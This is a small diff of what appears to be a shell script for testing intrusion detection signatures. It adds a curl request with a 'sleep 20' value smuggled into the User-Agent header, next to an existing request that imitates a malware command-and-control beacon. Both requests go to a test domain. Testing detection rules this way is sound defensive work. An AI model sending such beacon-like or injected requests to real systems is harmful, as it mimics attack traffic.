@@ -121,6 +121,7 @@ test_adware_pup () {
 
 test_malware_c2_beacon () {
    curl -s -X POST testmynids.org -H 'Content-Type: application/txt' -d '=eyJHVUlEIjoi=IlR5cGUiOJUeXBlIj' # sid: 2027793
+   curl -s testmynids.org/somepage.html?1234567890 -H 'User-Agent: sleep 20, Mozilla/5.0' # sid: 2016568
 }
 
 
